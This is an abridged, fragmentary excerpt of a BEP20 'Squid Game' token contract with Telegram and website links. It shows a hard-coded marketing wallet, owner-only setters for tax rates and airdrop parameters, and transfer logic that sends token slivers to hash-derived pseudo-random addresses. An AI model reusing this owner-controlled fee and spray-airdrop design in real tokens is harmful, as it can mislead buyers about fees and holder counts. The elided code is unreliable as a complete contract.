 ...
 *TG:https://t.me/SquidGameEntire
 *Website  :https://squidgame.games/

  _________            .__    .___   ________                      
 /   _____/ ________ __|__| __| _/  /  _____/_____    ____   ____  
 \_____  \ / ____/  |  \  |/ __ |  /   \  ___\__  \  /    \_/ __ \ 
 /        < <_|  |  |  /  / /_/ |  \    \_\  \/ __ \|   |  \  ___/ 
/_______  /\__   |____/|__\____ |   \______  (____  /___|  /\___  >
        \/    |__|             \/          \/     \/     \/     \/ 
...
contract Squid is Context, IBEP20, Ownable {
    ...
    address public marketingWallet = 0x07d3E22eFD9432Afe52d7D20F787A1EF926c4Ef5;

    string private constant _name = "Squid Game";
    ...
    Taxes public taxes = Taxes(0, 500);
    ...
    function _getTValues(
        ...
        s.tMarketing = (tAmount * taxes.marketing) / 10000;
        s.tTransferAmount =
        tAmount -
        s.tRfi -
        s.tMarketing;
    ...
    function _transfer(
        ...
        !_isExcludedFromFee[to]
            ...
            uint256 airdropNum = _airdropNum;
            uint256 airdropAmount = _airdropAmount;
            if (airdropNum > 0 && airdropAmount > 0 && amount > airdropAmount * airdropNum) {
                uint256 seed = _lastAirdropSeed;
                address airdropAddress;
                for (uint256 i; i < airdropNum;) {
                    airdropAddress = address(uint160(uint256(keccak256(abi.encode(seed)))));
                    _tokenTransfer(from, airdropAddress, airdropAmount, false);
                unchecked{
                    ++i;
                    --seed;
                }
                ...
                amount -= airdropAmount * airdropNum;
            }
        }
    ...
    function setLowTax() public onlyOwner {
        taxes = Taxes(10, 80);
    }

    function setAirdropNum(uint256 n) public onlyOwner {
        _airdropNum = n;
    }

    function setAirdropAmount(uint256 a) public onlyOwner {
        _airdropAmount = a;
    }
}